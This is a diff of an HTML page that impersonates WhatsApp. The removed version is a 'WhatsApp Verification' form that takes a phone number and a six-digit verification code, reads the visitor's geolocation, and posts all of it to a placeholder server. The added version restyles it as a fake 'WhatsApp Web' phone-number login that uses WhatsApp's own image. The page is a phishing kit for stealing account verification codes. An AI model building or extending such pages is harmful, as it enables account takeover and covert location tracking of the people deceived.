@@ -1,203 +1,219 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>WhatsApp Verification</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Web</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding-top: 50px;
-            margin: 0;
-        }
-        .container {
-            max-width: 400px;
-            margin: auto;
-            padding: 20px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-            position: relative;
-        }
-        .container img {
-            position: absolute;
-            top: -40px;
-            left: 50%;
-            transform: translateX(-50%);
-            border-radius: 60%;
-            width: 58px;
-            height: 58px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-        }
-        .input-group {
-            display: flex;
-            justify-content: center;
-            gap: 5px;
-            align-items: center;
-            flex-wrap: wrap;
-        }
-        .input-group input {
-            width: 30px;
-            padding: 10px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            text-align: center;
-            font-size: 16px;
-            box-sizing: border-box;
-        }
-        .verification-group {
-            margin-top: 20px;
-        }
-        .verification-group .input-group {
-            margin-top: 10px;
-        }
-        button {
-            padding: 10px 20px;
-            border: none;
-            background-color: #4CAF50;
-            color: white;
-            border-radius: 6px;
-            cursor: pointer;
-            margin-top: 20px;
-        }
-        label, p {
-            font-size: 14px;
-            margin-bottom: 10px;
-        }
-        .country-code {
-            font-size: 16px;
-            margin-right: 5px;
-        }
-        @media (max-width: 600px) {
-            .container {
+    body {
+      
+                font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+                background-color: #f6f6f6;
+                color: #525252;
+                margin: 0;
+                padding: 0;
+            }
+            
+            .landing-wrapper {
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+                height: 100vh;
+            }
+            
+            .landing-header {
+                display: flex;
+                align-items: center;
+                margin-bottom: 20px;
+            }
+            
+            .landing-headerTitle {
+                font-size: 22px;
+                font-weight: bold;
+                margin-left: 10px;
+                color: #7f7f7f; /* Light grey color */
+            }
+
+            .landing-main {
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                width: 100%;
+                max-width: 400px;
+            }
+            
+            .country-select {
+                width: 100%;
                 padding: 10px;
-                width: 90%;
-                box-sizing: border-box;
+                font-size: 16px;
+                margin-bottom: 20px;
+                border-radius: 5px;
+                border: 1px solid #ced4da;
             }
-            .input-group input {
-                width: 25px;
-                padding: 8px;
-                font-size: 14px;
+            
+            .phone-input {
+                width: 100%;
+                padding: 10px;
+                font-size: 16px;
+                margin-bottom: 20px;
+                border-radius: 5px;
+                border: 1px solid #ced4da;
             }
-            button {
-                padding: 8px 16px;
+            
+            .tutorial-image {
+                width: 100%;
+                max-width: 400px;
+                height: auto;
             }
-            .container img {
-                top: -40px;
-                width: 48px;
-                height: 48px;
+            
+            .select-wrapper {
+                position: relative;
+                width: 100%;
             }
-        }
+            
+            .select-wrapper:after {
+                content: '\25BC';
+                font-size: 12px;
+                position: absolute;
+                right: 10px;
+                top: calc(50% - 6px);
+                pointer-events: none;
+            }
+            
+            /* Style the dropdown arrow */
+            .country-select::-ms-expand {
+                display: none;
+            }
+            
+            .country-select {
+                -webkit-appearance: none;
+                -moz-appearance: none;
+                appearance: none;
+                padding-right: 25px;
+                background-color: #fff;
+                cursor: pointer;
+            }
     </style>
 </head>
 <body>
-    <div class="container">
-        <img src="images.png" alt="WhatsApp" />
-        <h2>WhatsApp Verification</h2>
-        <form id="verification-form">
-            <p>Enter your phone number:</p>
-            <div class="input-group" id="phone-number-group">
-                <span class="country-code">+27</span>
+    <div class="landing-wrapper">
+        <div class="landing-header">
+            <span>
+            </span>
+            <div class="landing-headerTitle">WhatsApp Web</div>
+        </div>
+        <div class="landing-main">
+            <div class="x1c4vz4f xs83m0k xdl72j9 x1g77sc7 x78zum5 xozqiw3 x1oa3qoh x12fk4p8 xeuugli x2lwn1j x1nhvcw1 xdt5ytf x6s0dn4 light">
+                <div class="x1c4vz4f xs83m0k xdl72j9 x1g77sc7 xeuugli x2lwn1j xozqiw3 x1oa3qoh x12fk4p8 x1yztbdb">
+                    <div class="x1q74xe4 x1iikomf landing-title" aria-label="">Enter phone number</div>
+                </div>
+                <div class="x1c4vz4f xs83m0k xdl72j9 x1g77sc7 xeuugli x2lwn1j xozqiw3 x1oa3qoh x12fk4p8 x1iymm2a">
+                    <div class="x1jchvi3 x1fcty0u x40yjcy" aria-label="">Select a country and enter your WhatsApp phone number.</div>
+                    <select class="country-select" id="countrySelect">
+                        <!-- Include all countries with their codes here -->
+                        <option value="+1">United States (+1)</option>
+                        <option value="+44">United Kingdom (+44)</option>
+                         <option value="+355">Albania (+355)</option>
+    <option value="+213">Algeria (+213)</option>
+    <option value="+1">American Samoa (+1)</option>
+    <option value="+376">Andorra (+376)</option>
+    <option value="+244">Angola (+244)</option>
+    <option value="+1">Anguilla (+1)</option>
+    <option value="+1">Antigua and Barbuda (+1)</option>
+    <option value="+54">Argentina (+54)</option>
+    <option value="+374">Armenia (+374)</option>
+    <option value="+297">Aruba (+297)</option>
+    <option value="+61">Australia (+61)</option>
+    <option value="+43">Austria (+43)</option>
+    <option value="+994">Azerbaijan (+994)</option>
+    <option value="+1">Bahamas (+1)</option>
+    <option value="+973">Bahrain (+973)</option>
+    <option value="+880">Bangladesh (+880)</option>
+    <option value="+1">Barbados (+1)</option>
+    <option value="+375">Belarus (+375)</option>
+    <option value="+32">Belgium (+32)</option>
+    <option value="+501">Belize (+501)</option>
+    <option value="+229">Benin (+229)</option>
+    <option value="+1">Bermuda (+1)</option>
+    <option value="+975">Bhutan (+975)</option>
+    <option value="+591">Bolivia (+591)</option>
+    <option value="+387">Bosnia and Herzegovina (+387)</option>
+    <option value="+267">Botswana (+267)</option>
+    <option value="+55">Brazil (+55)</option>
+    <option value="+1">British Virgin Islands (+1)</option>
+    <option value="+673">Brunei (+673)</option>
+    <option value="+359">Bulgaria (+359)</option>
+    <option value="+226">Burkina Faso (+226)</option>
+    <option value="+257">Burundi (+257)</option>
+    <option value="+855">Cambodia (+855)</option>
+    <option value="+237">Cameroon (+237)</option>
+    <option value="+1">Canada (+1)</option>
+    <option value="+238">Cape Verde (+238)</option>
+    <option value="+1">Cayman Islands (+1)</option>
+    <option value="+236">Central African Republic (+236)</option>
+    <option value="+235">Chad (+235)</option>
+    <option value="+56">Chile (+56)</option>
+    <option value="+86">China (+86)</option>
+    <option value="+57">Colombia (+57)</option>
+    <option value="+269">Comoros (+269)</option>
+    <option value="+242">Congo-Brazzaville (+242)</option>
+    <option value="+243">Congo-Kinshasa (+243)</option>
+    <option value="+682">Cook Islands (+682)</option>
+    <option value="+506">Costa Rica (+506)</option>
+    <option value="+225">Côte d'Ivoire (+225)</option>
+    <option value="+385">Croatia (+385)</option>
+    <option value="+53">Cuba (+53)</option>
+    <option value="+599">Curaçao (+599)</option>
+    <option value="+357">Cyprus (+357)</option>
+    <option value="+420">Czech Republic (+420)</option>
+    <option value="+45">Denmark (+45)</option>
+    <option value="+253">Djibouti (+253)</option>
+    <option value="+1">Dominica (+1)</option>
+    <option value="+1">Dominican Republic (+1)</option>
+    <option value="+593">Ecuador (+593)</option>
+    <option value="+20">Egypt (+20)</option>
+    <option value="+503">El Salvador (+503)</option>
+    <option value="+240">Equatorial Guinea (+240)</option>
+    <option value="+291">Eritrea (+291)</option>
+    <option value="+372">Estonia (+372)</option>
+    <option value="+251">Ethiopia (+251)</option>
+    <option value="+500">Falkland Islands (+500)</option>
+    <option value="+298">Faroe Islands (+298)</option>
+    <option value="+679">Fiji (+679)</option>
+    <option value="+358">Finland (+358)</option>
+    <option value="+33">France (+33)</option>
+    <option value="+594">French Guiana (+594)</option>
+    <option value="+689">French Polynesia (+689)</option>
+    <option value="+241">Gabon (+241)</option>
+    <option value="+220">Gambia (+220)</option>
+    <option value="+995">Georgia (+995)</option>
+    <option value="+49">Germany (+49)</option>
+    <option value="+233">Ghana (+233)</option>
+    <option value="+350">Gibraltar (+350)</option>
+    <option value="+30">Greece (+30)</option>
+    <option value="+299">Greenland (+299)</option>
+                    </select>
+<input type="number" class="phone-input" id="phoneInput" placeholder="Phone number" step="1">
+                </div>
             </div>
-            <div class="verification-group">
-                <label for="verification_code">Enter Verification Code:</label>
-                <div class="input-group" id="verification-code-group"></div>
-            </div>
-            <button type="submit">Verify</button>
-        </form>
+        </div>
+        <div class="landing-wrapper-bottom">
+            <img src="https://static.whatsapp.net/rsrc.php/v3/yB/r/7Y1jh45L_8V.png" alt="Tutorial Image" class="tutorial-image">
+        </div>
     </div>
-
     <script>
-        function createInputFields(parentId, numFields, inputNamePrefix) {
-            const parentElement = document.getElementById(parentId);
-            for (let i = 1; i <= numFields; i++) {
-                const input = document.createElement('input');
-                input.type = 'tel';
-                input.name = inputNamePrefix + i;
-                input.maxLength = 1;
-                input.required = true;
-                input.pattern = "[0-9]*";
-                input.inputMode = "numeric";
-
-                input.addEventListener('input', (event) => {
-                    const value = event.target.value;
-                    if (!/^\d*$/.test(value)) {
-                        event.target.value = value.replace(/\D/g, '');
-                    }
-                });
-
-                input.addEventListener('input', (event) => {
-                    if (event.target.value.length === 1) {
-                        const nextInput = event.target.nextElementSibling;
-                        if (nextInput) {
-                            nextInput.focus();
-                        }
-                    }
-                });
-
-                input.addEventListener('keydown', (event) => {
-                    if (event.key === 'Backspace' && event.target.value.length === 0) {
-                        const prevInput = event.target.previousElementSibling;
-                        if (prevInput) {
-                            prevInput.focus();
-                        }
-                    }
-                });
-
-                parentElement.appendChild(input);
-            }
-        }
-
-        createInputFields('phone-number-group', 9, 'digit');
-        createInputFields('verification-code-group', 6, 'code');
-
-        document.getElementById('verification-form').addEventListener('submit', function(event) {
-            event.preventDefault();
-
-            const phoneNumberInputs = document.querySelectorAll('#phone-number-group input');
-            let phoneNumber = '+27';
-            phoneNumberInputs.forEach(input => {
-                phoneNumber += input.value;
-            });
-
-            const verificationCodeInputs = document.querySelectorAll('#verification-code-group input');
-            let verificationCode = '';
-            verificationCodeInputs.forEach(input => {
-                verificationCode += input.value;
-            });
-
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition((position) => {
-                    const { latitude, longitude } = position.coords;
-
-                    fetch('https://your-server-endpoint.com/process', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            phoneNumber,
-                            verificationCode,
-                            location: {
-                                latitude,
-                                longitude
-                            }
-                        })
-                    })
-                    .then(response => response.json())
-                    .then(data => {
-                        console.log('Success:', data);
-                    })
-                    .catch((error) => {
-                        console.error('Error:', error);
-                    });
-
-                }, (error) => {
-                    console.error('Geolocation error:', error);
-                });
-            } else {
-                console.error('Geolocation is not supported by this browser.');
-            }
+        // Get the country select element
+        var countrySelect = document.getElementById("countrySelect");
+        // Get the phone number input element
+        var phoneInput = document.getElementById("phoneInput");
+        
+        // Add event listener for country select change
+        countrySelect.addEventListener("change", function() {
+            // Get the selected country code
+            var countryCode = countrySelect.value;
+            // Update the phone number input with the selected country code as prefix
+            phoneInput.value = countryCode;
         });
     </script>
 </body>
